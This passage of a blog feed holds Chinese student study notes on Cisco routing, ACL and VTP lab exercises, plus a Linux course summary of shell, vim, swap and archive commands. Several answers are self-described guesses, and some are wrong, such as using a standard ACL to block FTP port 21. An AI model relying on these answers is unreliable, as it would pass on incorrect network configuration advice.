class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>动态路由协议的配置主要包含哪两个步骤？</p><blockquote><p><s>配置各路由器、PC的相关配置和配置路由协议（我猜的，没找到确切答案）</s></p></blockquote></li><li><p>通过RIP协议的调试步骤，可以得出RIP路由表的默认更新时间约是多少？</p><ul><li>RIP路由协议默认更新周期是30秒</li></ul></li><li><p>OSPF协议通过那条命令可以获得路由器的ID？</p></li></ol><ul><li>show ip protocols</li></ul><ol start="4"><li><p>如果两台路由器一台运行RIP第1版，一台运行第2版，两台主机是否可以ping通？通过使用show ip route 查看两台路由器的路由表，确定版本1与版本2之间究竟谁可以接受谁的路由更新？（单边邻居关系）</p><blockquote><p style="color:blue;">两台主机不能ping通，RIP版本1可以接受版本2，因为RIPv2需要包含子网掩码，而版本1并不含有子网掩码，版本1的协议发往版本2后，版本2会将该报文丢弃，而当版本1接受到版本2的报文时，版本1会收下版本2的报文</p></blockquote></li></ol><h4 id="acl">ACL</h4><pre class="line-numbers language-、" data-language="、"><code class="language-、">access-list[list number][permit&#x2F;deny][source address][address][wildcard mask][log]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>标准ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> deny host <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.2</span><span class="token comment"># 拒绝来自1.1.1.2的主机通过</span><span class="token comment"># 可以利用关键字"host"来代表通配符掩码0.0.0.0,表示一台主机</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> permit <span class="token builtin">any</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">1</span> out<span class="token comment"># 访问列表的出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拓展ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> deny tcp <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> <span class="token number">2.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> eq telnet<span class="token comment"># telnet使用的是TCP的23号端口、eq其实是等于....</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> permit tcp <span class="token builtin">any</span> <span class="token builtin">any</span><span class="token comment"># 这两条语句的顺序;访问表语句的处理顺序是由上到下的。如果我们将两个语句顺序颠倒，将permit语句放在deny语句的前面，则我们将不能过滤来自主机地址的报文</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">101</span> <span class="token keyword">in</span><span class="token comment">#访问控制列表 出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>根据本次实验，你认为ACL一般有哪些配置步骤？</p><p><strong><s>跟上面那个动态路由一样，我没弄出来</s></strong></p></li><li><p>在步骤4中，如果要使得1.0.0.0整个网络无法访问2.0.0.0该如何配置？</p><ul><li>可以使用Access-list 1 deny 指令阻止整个网段的访问</li></ul></li><li><p>在步骤5中，虽然禁止的是telnet，但此时PC1是否可以ping通PC2?为达到ping通的目的，应该如何处理？</p><ul><li>ping 命令通过ICMP协议进行报文传输，在访问控制类别中没有运行ICMP或者IP报文的访问，所以ping指令也无法通信。</li></ul></li><li><p>禁止FTP应该如何配置访问控制列表？</p><ul><li>通过access-list 1 deny命令禁止代表FTP协议的21号端口即可禁止FTP</li></ul></li></ol><h4 id="vtp">VTP</h4><p><strong>配置级联接口的Trunk封装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">switchport trunk encapsulation dot1q<span class="token comment">#接口的trunk封装802.1Q协议，用于启用trunk</span>switchport mode trunk<span class="token comment">#设置接口模式为trunk模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置交换机的工作模式</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">vtp mode <span class="token punctuation">[</span>server<span class="token operator">/</span>client<span class="token operator">/</span>transparent<span class="token punctuation">]</span> <span class="token comment">#分别是服务器，客户端和透明模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>VTP服务器控制着它们所在域中VALN的生成和修改</li><li>VTP客户机不允许管理员创建、修改或删除VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们的VTP配置情况</li><li>VTP透明模式中的交换机不参与VTP，交换机处于透明模式时，不通告其VLAN配置信息。它的VLAN数据库更新与收到的通告也不保持同步。可以创建和删除本地的VLAN。这些VLAN的变更不会传播到其他任何交换机上</li></ul><p><strong>更改交换机的域名</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch (config)# vtp domain qrnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果将S2的工作模式更改为透明模式，S2是否会学习S1的VLAN划分？<ul><li>不会，透明模式不会学习服务器的配置</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络工程-cisco设备基本语法&quot;&gt;网络工程——CISCO设备基本语法&lt;/h2&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;交换机配置：&quot;&gt;交换机配置：&lt;/h3&gt;
&lt;pre class=&quot;line-numbers language-swift&quot; data-lang</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Cisco" scheme="https://shierjinghuang.github.io/tags/Cisco/"/>
    
  </entry>
  
  <entry>
    <title>Linux 知识点汇总</title>
    <link href="https://shierjinghuang.github.io/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</id>
    <published>2023-02-10T03:56:43.000Z</published>
    <updated>2025-03-29T03:48:00.627Z</updated>
    
    <content type="html"><![CDATA[<h2><center>Linux 知识点汇总</center></h2>[TOC]<h4 id="P4-Linux的基本特征-8个"><a href="#P4-Linux的基本特征-8个" class="headerlink" title="P4: Linux的基本特征 8个"></a>P4: Linux的基本特征 8个</h4><ul><li><strong>开放性</strong>：系统遵循世界标准规范，特别是遵循开放系统互连(OSI) 国际标准 </li><li><strong>多用户</strong>：系统资源可以被不同的用户各自拥有使用。每个用户对自己的资源有特定的权限，互不影响。</li><li><strong>多任务</strong>：计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器</li><li><strong>快速性</strong>：Linux 不大在意CPU的速度，它可以把处理器的性能发挥到极限</li><li><strong>安全性</strong>：Iinux 采取了许多安全技术措施，包括对读、写进行权限控制，带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障</li><li><strong>网络性</strong>：Linux 是在Internet的基础上产生并发展起来的，因此，完善的内置网络是Linux的一大特点。</li><li><strong>移植性</strong>：Linux能够在从微型计算机到大型计算机的任何环境中和任何平台上运行。</li><li><strong>兼容性</strong>：Linux是一款与POSI (Portable Operating System Interface)相兼容的操作系统，它所构成的子系统支持所有相关的ANSI、ISO、 IETF 和W3C业界标准。</li></ul><h4 id="P25-26-关机与注销"><a href="#P25-26-关机与注销" class="headerlink" title="P25-26: 关机与注销"></a>P25-26: 关机与注销</h4><ol><li><p>从图形界面关机：右上角齿轮</p></li><li><p>从命令行关机</p><ul><li><p><strong>关机命令 shutdown</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># shutdown &#x2F;&#x2F;要等待一会儿# shutdown +5 &#x2F;&#x2F;5min后关机# shutsown 19:20 &#x2F;&#x2F;19：20关机-f&#x2F;-F 重新启动时执行&#x2F;不执行fsck-k 仅送出信息给所有用户，不会实际关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注销命令 exit</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">exit [状态值]&#x2F;&#x2F; 0表示执行成功，其他值表示失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启命令 reboot</p><pre class="line-numbers language-none"><code class="language-none">-d 重启时不把数据写入记录文件-n 重开机前不检查有未结束的程序-w 仅测试不重启，把数据写入记录文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p><strong>（第三章 考试重点）</strong></p><h4 id="P57-Shell常用特殊符号-7个"><a href="#P57-Shell常用特殊符号-7个" class="headerlink" title="P57: Shell常用特殊符号 7个"></a>P57: Shell常用特殊符号 7个</h4><ul><li>“ ***** “ 表示一个(包括空字符)或多个字符组成的字符串</li><li>“ <strong>?</strong> “ 表示单个字符</li><li>“ <strong>[]</strong> “ 用于指定显示内容范围</li><li>“ <strong>!</strong> “ 用于指定不显示内容，与” <strong>[]</strong> “一同使用</li><li>“ <strong>;</strong> “ 用于同一行中分隔多个命令</li><li>“ <strong>`</strong> “ 命令替代符，包含内容在Shell中为一条命令，并被执行</li><li>“ <strong>#</strong> “ 注释符号，该行内容不被执行</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &#x2F;bin&#x2F;e*  &#x2F;&#x2F;查看&#x2F;bin目录下的e开头的所有文件和文件夹ls -l &#x2F;bin&#x2F;e？ &#x2F;&#x2F;查看e开头，长度为2的所有文件和文件夹ls [a-c]  &#x2F;&#x2F;为a b c的文件和文件夹ls [!a-c]     &#x2F;&#x2F;显示名不为为a b c的文件和文件夹ls -l  &#x2F;&#x2F;显示目录下的文件和文件夹和查看其详细信息echo &#96;ls -l&#96;  &#x2F;&#x2F;字符串输出为指令执行结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P57-Shell常用操作-4个"><a href="#P57-Shell常用操作-4个" class="headerlink" title="P57: Shell常用操作 4个"></a>P57: Shell常用操作 4个</h4><ul><li><p>自动命令补全功能 ——TAB键</p></li><li><p>自动输入历史命令 ——history命令</p></li><li><p>重定向</p><p>  让用户从文件输入命令，或将输出结果存储在文件及设备中，不需要输入输出设备</p><ul><li>输出重定向符**”&gt;”(写入并覆盖)<strong>和</strong>“&gt;&gt;”(追加)**，输入重定向符”&lt;”</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &gt; test &#x2F;&#x2F;将执行结果写入test文件中，没有test就自动创建&#x2F;&#x2F;显示器无结果表示重定向成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>管道</p><blockquote><p>管道是一种通信机制，是一种特殊文件，可以进行读写。</p></blockquote><blockquote><p>除首尾的两个命令，每一个命令的输入都来自前一个命令的输出</p></blockquote><blockquote><p>“ <strong>|</strong> “ 将多个简单命令结合在一起，实现复杂的功能</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l | grep test &#x2F;&#x2F;查看当前目录下test的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P61-Shell常用命令-10个"><a href="#P61-Shell常用命令-10个" class="headerlink" title="P61: Shell常用命令 10个"></a>P61: Shell常用命令 10个</h4><p>（第四题考 书上命令要很了解）</p><ul><li><p><strong>ls 查看指定工作目录下的内容</strong></p><blockquote><p style="color:blue;">ls [选项] [路径]</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -a&#x2F;-A 显示所有文件及目录，列出&#x2F;不列出隐藏文档(隐藏文档名称开头有&quot;.&quot;)ls -l 除文件名外，显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd 查看当前工作目录的绝对路径</strong></p></li><li><p><strong>uname 查看当前系统内核信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uname 显示内核名uname -r 显示内核版本号uname -o 显示系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd 切换目录</strong></p><blockquote><ul><li><p style="color:blue;">cd [路径]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F; &#x2F;&#x2F;切换到&#x2F;目录cd ~ &#x2F;&#x2F;切换到当前用户主目录cd .. &#x2F;&#x2F;切换到上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cat 显示文件内容</strong></p><blockquote><ul><li><p style="color:blue;">cat [选项] [文件] </p></li></ul></blockquote></li><li><p><strong>clear 清屏</strong></p></li><li><p><strong>sudo 切换用户身份执行</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo adduser Me &#x2F;&#x2F;以root用户运行adduser命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>su 切换用户</strong></p><blockquote><ul><li><p style="color:blue;">sudo    [选项] [命令]    </p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo su root &#x2F;&#x2F;切换到root用户#su Me &#x2F;&#x2F;切换到Me用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>ifconfig 显示和配置网络设备属性</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>man 系统帮助(命令的详细内容和使用方法)</p><blockquote><ul><li><p style="color:blue;">man [命令名]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">man ls &#x2F;&#x2F;查看ls命令的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="P65-96-编辑器-2个"><a href="#P65-96-编辑器-2个" class="headerlink" title="P65-96: 编辑器 2个"></a>P65-96: 编辑器 2个</h4></li></ul><p>(编辑器的基本使用，考察，至少知道哪个是编辑器)</p><p><strong>1.Gedit编辑文档</strong></p><p>窗口四个部分：菜单栏、工具栏、文档编辑栏、状态栏</p><p>菜单栏：文件、编辑、查看、搜索、工具、文档、帮助</p><ul><li>文件：新建、打开、保存、保存为、还原、打印预览、打印、关闭、推出</li><li>编辑：撤销、重做、剪切、复制、粘贴、删除、全部选中、插入日期和时间、首选项</li><li>查看：……</li></ul><pre class="line-numbers language-none"><code class="language-none">gedit test.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>“+” 前台运行</p><p>“&amp;” 后台运行，进入自己的编辑器 </p></blockquote><p><strong>2.VIM的使用和配置</strong></p><p><strong>3种工作模式：输入模式、指令模式、底行模式</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim test &#x2F;&#x2F;光标置于最后一行vim n test &#x2F;&#x2F;光标置于第n行vim pattern test &#x2F;&#x2F;光标置于第一个与pattern匹配的串处vim -r test &#x2F;&#x2F;发生系统崩溃，恢复文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只读模式切输入模式</p><pre class="line-numbers language-none"><code class="language-none">i 光标前(光标在第一行第一列)a 光标后(光标在第一行第二列)I 当前行首A 当前行尾o&#x2F;O 当前行之下&#x2F;上新开一行r 替换当前字符……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>输入模式切指令模式 <strong>Ecs键</strong></p><pre class="line-numbers language-none"><code class="language-none">移动光标类指令：光标上移一行 k ; 光标下移一行 j光标左移一字符 h ; 光标右移一字符 l……屏幕翻滚类指令：Ctrl+u 文件首翻半屏……复制、删除、粘贴类指令：……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>指令模式切底行模式  <strong>: 或 ? 或 /</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;pattern 从光标开始处向文件尾搜索pattern?pattern 从光标开始处向文件首搜索pattern:w 保存  :x 保存并退出  :q 退出  :! 强制退出:q! 不保存文件并退出:wq 保存并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>VIM配置</strong></p><p>定制VIM编辑器属性方便编写文档，配置文件地址为/etc/vim/vimrc，该文件会在启动时读取，该命令为底行模式命令，命令写入文件后使用时不必重复键入命令</p><p>更新最新vim版本(vim,vim-common,vim-doc,vim-runtiem)，切换到root权限下，打开vim配置文件(vim /etc/vim /vimrc)，将需要命令前的注释键#删除。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">syntax on 关键字高亮set tabstop&#x3D;4 按下tab键跳跃4个光标set background&#x3D;dark 更改背景为深色……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P77-挂载"><a href="#P77-挂载" class="headerlink" title="P77: 挂载"></a>P77: 挂载</h4><p>挂载：在Linux或UNIX系统中，<strong>任何个种类的文件系统被创建后，都需要挂载到某个特定的目录才能使用，这个过程相当于激活一个文件系统</strong>，使它能够被使用。</p><p>Linux使用<strong>mount工具</strong>来对文件系统进行挂载。挂载文件系统时需要明确挂载点，比如在安装Ubuntu的过程中，读者实际上已经接触过挂载的过程了，在创建文件系统后，操作系统会提示将此文件系统挂载至哪个位置，而这个位置就是挂载点，在那个时候，通常都选择挂载点为“/”，即根目录。此外，还可以利用该工具挂载其他种类的文件系统，也需要涉及挂载点的选择，挂载点的实质是一个空置的目录。</p><p>Windws文件系统的挂获原理是将磁盘分成若干分区，在各个分区中挂载文件系统。而Linux的挂载原理与Windows不同，它是将磁盘空间挂载在一个目录下。</p><h4 id="P81-swap交换分区"><a href="#P81-swap交换分区" class="headerlink" title="P81: swap交换分区"></a>P81: swap交换分区</h4><ul><li><p>什么是交换分区？</p><ul><li>在Linux中，交换分区是“虚拟内存”技术的集中体现。它代替了Windows中交换文件的概念，但实质都是<strong>利用硬盘空间，临时当作内存使用</strong></li><li>虚拟内存在功能上突破了物理内存的限制，是程序可以操纵大于实际物理内存的空间，更重要的是，虚拟内存是隔离每个进程的安全保护网，可以使每个进程都不受其他程序的干扰</li></ul></li><li><p><font color=Brown>怎么交换？有什么功能？交换多少合适？</font></p><ul><li><p>当系统的物理内存不够用的时候，才进行分区的交换。将物理内存中的一部分空间释放出来，以供当前运行的程序使用，被释放的空间的程序被临时保存到交换分区中，等到那些程序要运行时，再从交换分区中恢复保存的数据到内存中。被释放的空间可能来自一些很长时间没有什么操作的程序。</p></li><li><p>分配太多的交换分区会浪费磁盘空间，而交换分区太少，系统则会发生错误。通常情况下，交换分区应<strong>大于或等于物理内存的大小</strong>，最小<strong>不应小于64M</strong>，通常交换分区得大小应是物理内存(虚拟机的)得<strong>2~2.5倍</strong>。</p><blockquote><ul><li><p>不是所有物理内存中交换出来的数据都会被放到交换分区中，会导致不堪负重，有相当一部分数据会被直接交换到文件系统，如文件读写</p></li><li><p>交换分区是”匿名“内存数据的交换空间。”匿名“内存数据如malloc和new函数生成的对象的数据，以及堆栈中一些状态和变量数据等。malloc和new函数生成的对象的数据，即人为在内存上进行的空间操作，它们在文件系统中没有相应的”存储“文件，需要交换分区。</p></li></ul></blockquote></li></ul></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># swapon -s &#x2F;&#x2F;查看当前系统的交换分区情况Filename表示当前交换分区挂载的位置，Type表示该分区的文件格式，partition表示交换分区，&#x2F;dev&#x2F;sda5表示第一块硬盘的第一个扩展分区的第一个逻辑磁盘&#x2F;dev&#x2F;hda, &#x2F;dev&#x2F;hdb, &#x2F;dev&#x2F;sda, &#x2F;dev&#x2F;sdbhda一般是指IDE接口的硬盘，hda指第一块硬盘，hdb指第二块硬盘,等等；sda一般是指SATA接口的硬盘，sda指第一块硬盘，sdb指第二块硬盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>交换分区的数量对性能有很大的影响。因为分区的交换操作是磁盘I/O的操作，多个交换分区可以轮流使用，均衡I/O的负载，而单一交换分区会很忙使系统大多数时间处于等待状态，效率很低。系统很慢，但CPU不忙，说明问题在I/O上。</li></ul><p><strong>交换分区的管理</strong></p><p>交换分区是分页管理的，每一页的大小和内存也得大小一样，以方便数据交换。</p><blockquote><p>旧版本实现交换分区，用交换分区第1页作为所有交换分区的一个”映射“，即第1页的每一位都对应一页交换分区。如果这一位是1，表示此页可用；如果这一位是0，表示此页是环块，不可用。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ vmstat 3  &#x2F;&#x2F;每3秒捕获一次系统性能指标Procs下的r表示正在等待的进程数量（等待块），b表示输入输出Memory下的swpd表示使用的Swap空间的大小Swap下的si表示系统的交换回内存的总量，so表示CPU每秒交换总量以上指标的数值越大，表示系统越繁忙，其繁忙程度与系统具体的配置有关。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230209224236885.png"></p><p><font color="red"><strong>交换分区常用管理方法</strong></font> </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">1.切换为超级用户（管理员），cd到&#x2F;root目录下sudo su rootcd &#x2F;root2.创建一个swap文件（有连续空间的），其路径为&#x2F;root&#x2F;swapfiledd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;root&#x2F;swapfile bs&#x3D;1024 count&#x3D;65536(ls &#x2F;&#x2F;存在一个snap和swapfile文件)3.格式化swap分区mkswap swapfile &#x2F;&#x2F;将刚才建立的&#x2F;root&#x2F;swapfile文件格式化为swap格式4.激活swap分区swapon swapfile5.检查刚建立的交换分区文件是否存在swapon -s6.回收&#x2F;root&#x2F;swapfile文件所占用的交换空间swapoff swapfile7.删除&#x2F;root&#x2F;swapfile文件rm swapfile(永久创建 vim &#x2F;etc&#x2F;fstab)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P88-91-压缩和解压-3个"><a href="#P88-91-压缩和解压-3个" class="headerlink" title="P88-91: 压缩和解压 3个"></a>P88-91: 压缩和解压 3个</h4><ul><li><p><strong>zip和unzip</strong></p><ul><li><p>zip命令一般解压有规则特征的应用程序</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">zip -m abc.zip a b c &#x2F;&#x2F;-m:压缩后，删除原始文件(将文件移入压缩文件) zip -r test.zip test&#x2F; &#x2F;&#x2F;-r:递归处理，压缩指定目录下的所有文件和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>unzip解压</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">unzip abc.zip &#x2F;&#x2F;直接解压，压缩文件依然存在unzip -d test1 abc.zip &#x2F;&#x2F;-d&lt;目录&gt;:指定文件解压后的存储目录，没有的话新建unzip abc.zip -x a &#x2F;&#x2F;-x&lt;文件&gt;：指定压缩文件中不解压的文件unzip -l abc.zip &#x2F;&#x2F;-l:显示压缩文件所包含的文件unzip -Z abc.zip &#x2F;&#x2F;-Z:显示压缩文件中文件的具体信息，不解压<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>tar解压规则/不规则程序</strong></p><p>（1）-cvf：文件归档但不压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps15.jpg" alt="img" style="zoom: 67%;" /> </center>（2）gzip压缩和解压缩 -z</li></ul><p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps16.jpg" alt="img" style="zoom: 67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps17.jpg" alt="img" style="zoom:67%;" /> </center>（3）bzip2压缩和解压缩 -j<p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps18.jpg" alt="img" style="zoom:67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps19.jpg" alt="img" style="zoom:67%;" /> </center>#### P92：文件系统管理命令 6类20个<ol><li><p>文件的基本操作</p><ul><li><p><strong>touch 创建一个新文件，存在则修改文件最后修改日期</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">touch [参数] [文件名]touch a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp 复制一个或多个文件，也可以复制一个目录</strong></p><blockquote><ul><li><p style="color:blue;">touch [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp a.cpp c.cpp &#x2F;&#x2F;复制a.cpp到当前目录c.cpp中-v 查看复制过程-i 询问，是否覆盖原来已经存在的同名文件-r 递归处理，实现目录复制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mv 移动文件或目录，也可以进行重命名</strong></p><blockquote><ul><li><p style="color:blue;">mv [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mv dir1&#x2F;a dir2&#x2F;mv b bbb &#x2F;&#x2F;b重命名为bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rm 删除一个或多个文件，也可以递归删除目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rm dir1&#x2F;bbbrm -ri dir1&#x2F; &#x2F;&#x2F;递归处理来删除目录，并询问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>目录的基本操作</p><ul><li><p><strong>mkdir 创建一个目录</strong></p><blockquote><ul><li><p style="color:blue;">mkdir [参数] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">mkdir dir1 &#x2F;&#x2F;当前目录下创建一个目录mkdir -p dir2&#x2F;dir22&#x2F;dir222 &#x2F;&#x2F;-p实现多层目录的建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rmdir 删除一个目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rmdir dir1rmdir -p dir2&#x2F;dir22&#x2F;dir22 &#x2F;&#x2F;-p实现多层目录的全部删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看文件内容</p><ul><li><p><strong>more 在终端屏幕按屏显示文本文件</strong></p><p>   在终端屏幕显示文本文件：Enter一行，空格一屏（如果-num有参数，显示num行），q退出</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">more -8 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;每屏显示8行ls &#x2F;etc&#x2F; | more -10 &#x2F;&#x2F;查看&#x2F;etc目录的文件信息，每屏显示10行-p 实现清屏-d 显示友好信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>less 在终端屏幕按屏显示文本文件</strong></p><p>  在终端屏幕显示文本文件，不能Enter和Space翻阅，增加：鼠标滑动显示内容；底部提示符为“ : ”</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;etc&#x2F; | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head 显示前几行或几字节</strong></p>  <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001613397.png" alt="image-20230210001613397" style="zoom:67%;" /></li><li><p><strong>tail 显示前/最后几行或几字节</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191142439.png" alt="image-20230212191142439" style="zoom:67%;" /><p>（head和tail这两命令同理）</p></li><li><p>od 按照特殊格式查看文件内容</p><pre class="line-numbers language-none"><code class="language-none">字码基数 -d 十进制；-o 八进制(默认)；-x 十六进制 -t 设置输出格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>文件类型</p><ul><li><p><strong>文件类型</strong></p><p><font color="red"><strong>- 普通文件</strong>，<strong>d 目录</strong>，c 字符设备（串口设备：调制解调器），b 块设备（接口设备：硬盘、光驱），l 符号链接文件（快捷方式），s 套接口文件（网络通信文件），p 管道文件（FIFO文件，进程间通信机制）</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210003215624.png" alt="image-20230210003215624" style="zoom:67%;" /></li><li><p><strong>file 辨识文件类型</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001908362.png" alt="image-20230210001908362" style="zoom:67%;" /></li></ul></li><li><p>查询文件</p><ol><li><p><strong>find 在目录结构中查找文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find &#x2F;etc -name vim* 